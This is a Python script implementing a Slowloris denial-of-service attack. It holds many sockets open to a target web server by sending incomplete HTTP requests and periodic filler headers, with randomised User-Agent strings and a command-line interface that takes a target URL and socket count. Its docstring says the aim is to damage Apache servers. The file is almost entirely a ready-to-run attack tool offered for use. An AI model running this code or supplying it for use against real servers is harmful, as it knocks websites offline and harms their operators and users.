#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
import sys
import time
import socket
import logging
import argparse

from Queue import Queue
from threading import Thread
from random import randint, choice, shuffle
from fake_useragent import UserAgent, FakeUserAgentError


class SlowLoris(Thread):
    """
        SlowLoris this class implement a HTTP vulnerability and damage different https based web-servers like a Apache 1.x, Apache 2.x and etc.
        This class extends Thread that's mean you must launch in like a thread.(Thank you, captain Obvious!)
    """

    numberOfBuilders = 3

    def __init__(self, url, soc_cnt=300, port=80, headers={
        'User-Agent': None,  # UserAgent()
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ru,en-us;q=0.7,en;q=0.3',
        'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive'
    }):
        """
        :param url: link to web-server
        :param soc_cnt: maximum count of created socket default value 300
        :param port: default value 80
        :param headers: HTTP headers what puts in request
        """
        super(SlowLoris, self).__init__()
        self.url = url
        self.port = port
        if 0 > soc_cnt or soc_cnt > 1000:
            raise ValueError("Sockets count is to large {}".format(soc_cnt))
        self.soc_cnt = soc_cnt
        self.headers = headers
        self.fake_ua = UserAgent()
        self.__sockets = []
        self.__sended_request_cnt = 0
        self.__died_sockets_cnt = 0
        self.__alive_socket_cnt = 0
        self.is_stop = False

    def __del__(self):
        for con in self.__sockets:
            try:
                con.close()
            except:
                # TODO: add logging here
                pass
        del self.__sockets

    def __create_socket(self):
        while True:
            if self.__alive_socket_cnt <= self.soc_cnt:
                try:
                    res = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    res.settimeout(5)
                    res.connect((self.url, self.port))
                    res.send("GET /? {} HTTP/1.1\r\n".format(randint(0, 9999999)))
                    for k in self.headers.keys():
                        if k == "User-Agent":
                            self.headers[k] = str(self.fake_ua.random)
                        res.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
                except Exception as e:
                    # TODO: add logging here
                    pass
                else:
                    self.__sockets.append(res)
                    self.__alive_socket_cnt += 1

    def __send_request(self, q):
        while True:
            soc = q.get()
            try:
                soc.send("X-a: {} \r\n".format(randint(0, 9999999)))
                self.__sended_request_cnt += 1
            except:
                self.__sockets.remove(soc)
                self.__died_sockets_cnt += 1
                self.__alive_socket_cnt -= 1
                # TODO: add logging here
            finally:
                q.task_done()

    def kill(self):
        self.is_stop = True

    def run(self):
        for _ in xrange(self.numberOfBuilders):
            t = Thread(target=self.__create_socket)
            t.daemon = True
            t.start()

        while self.__alive_socket_cnt <= self.soc_cnt:
            time.sleep(1)

        self.__alive_socket_cnt = self.soc_cnt

        queue = Queue(self.soc_cnt * 2)

        for _ in xrange(self.numberOfBuilders):
            t = Thread(target=self.__send_request, args=(queue,))
            t.daemon = True
            t.start()

        while not self.is_stop:
            if self.__alive_socket_cnt <= self.soc_cnt:
                time.sleep(1)
            for s in self.__sockets[:self.soc_cnt]:
                queue.put(s)
                queue.join()

    def get_counters(self):
        return {"alive": self.__alive_socket_cnt, "died": self.__died_sockets_cnt,
                "requests": self.__sended_request_cnt}


def validate_url(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return regex.match(url)


def init():
    # TODO write logging init
    pass


def parse_args():
    # TODO write description
    parser = argparse.ArgumentParser(add_help=True, description="")
    parser.add_argument("-u", "--url", action="store", type=str, help="")
    parser.add_argument("-s", "--socket-count", default=300, action="store", type=int, help="")
    # parser.add_argument("-l", "--list", action="store", type=str, help="") # TODO write list of sites
    parser.add_argument("-m", "--mode-log", default=0, action="store", type=int, help="")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(-1)

    res = {}

    args = parser.parse_args()

    if args.url:
        if validate_url(args.url):
            res["url"] = args.url
        else:
            parser.print_help()
            sys.exit(-1)
    else:
        parser.print_help()
        sys.exit(-1)

    if 0 < args.socket_count <= 1000:
        res["ss"] = args.socket_count
    else:
        parser.print_help()
        sys.exit(-1)

    if 0 <= args.mode_log <= 2:
        # TODO logger init
        pass
    else:
        parser.print_help()
        sys.exit(-1)

    return res


def main(**kwargs):
    # TODO Write a beauty menu
    # TODO Write loggging

    sl = SlowLoris(url=kwargs["url"], soc_cnt=kwargs["ss"])
    sl.start()
    while True:
        try:
            sys.stdout.write("\r{}".format(sl.get_counters()))
            sys.stdout.flush()
            time.sleep(1)
        except:
            sl.kill()
            sys.exit(-1)


if __name__ == "__main__":
    args = parse_args()
    init()
    main(**args)
